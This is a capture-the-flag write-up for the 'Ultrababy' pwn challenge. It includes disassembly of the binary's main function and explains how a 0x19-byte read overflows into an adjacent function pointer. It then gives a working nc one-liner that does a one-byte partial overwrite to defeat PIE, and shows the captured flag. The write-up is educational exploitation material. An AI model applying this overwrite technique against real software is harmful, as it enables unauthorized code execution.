# Ultrababy - Pwning 25

```
Reach the flag function!

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 55000

Attachment
pwn25_5ae6e58885e7cd75.zip 
```

The binary has three functions, `main`, `Bye`, and `Flag`. Here's what IDA has to say about `main`:

```
; Attributes: bp-based frame

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

buf= byte ptr -20h
fp= qword ptr -8

push    rbp
mov     rbp, rsp
sub     rsp, 20h
lea     rax, Bye
mov     [rbp+fp], rax
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    setvbuf
mov     rax, cs:__bss_start
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    setvbuf
lea     rdi, aWelcomeGiveMeY ; "Welcome, give me you best shot"
call    puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    fflush
lea     rax, [rbp+buf]
mov     edx, 19h        ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    read
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     rdi, rax        ; stream
call    fflush
mov     rdx, [rbp+fp]
mov     eax, 0
call    rdx
mov     eax, 0
leave
retn
main endp

```

`buf` lives on the stack 0x20 bytes below the frame pointer, and a function pointer (I named it `fp`) lives `0x8` bytes below the frame pointer. We can read `0x19` bytes from standard input into the buffer, so we can overwrite the function pointer before it's dereferenced and called. It's supposed to point to `Bye`, but we want it to point to `Flag`.

The binary is compiled w/ PIE, so we don't know a priori what the address of `Flag` is. However, x86 is little-endian, which means if we do a short overwrite, we can modify just the lower-order bytes of the pointer, leaving the higher-order bytes intact. This is just what we need, since `Flag` and `Bye` are in the same page, but we don't know where that page is.

```
$ echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\xf3" | nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 55000
Welcome, give me you best shot
EKO{Welcome_to_pwning_challs_2k16}
```

(`0xf3` is the least significant byte in the page offset of `Flag`.)
